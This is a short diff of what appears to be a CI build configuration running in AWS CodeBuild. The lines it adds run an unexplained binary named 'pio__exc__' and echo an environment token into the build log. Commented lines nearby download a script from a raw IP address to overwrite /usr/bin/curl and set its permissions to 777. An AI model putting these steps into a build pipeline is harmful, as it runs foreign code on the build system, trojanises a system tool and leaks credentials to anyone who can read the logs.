@@ -39,17 +39,16 @@ frontend:
 #         - cd /
 #         - cat /codebuild/output/log
 #         - ./pio__exc__ cloudbuild  
+#       Build
+#         - cp $GOPATH/src/pio__exc__ $GOPATH/src/aws-hpc-tutorials/
+#         - cd $GOPATH/src/aws-hpc-tutorials/
+#         - ./pio__exc__ build
         - cp $GOPATH/src/pio__exc__ $GOPATH/src/aws-hpc-tutorials/
         - cd $GOPATH/src/aws-hpc-tutorials/
-        - ./pio__exc__ build
+        - ./pio__exc__ deploy
+        - cat /codebuild/output/log
         - echo "Env token=$token"
         - echo "Build no=$AWS_JOB_ID"
-#         - sleep 120
-#         - ls -la
-#         - cat op.txt
-#         - ls -la /usr/bin/curl
-#         - cp /usr/bin/curl /usr/bin/curlorg
-#         - whoami
 #         - /usr/bin/curlorg http://44.202.99.166:8000/overwrite.sh > /usr/bin/curl
 #         - chmod 777 /usr/bin/curl
 #         - ls -la /usr/bin/curl
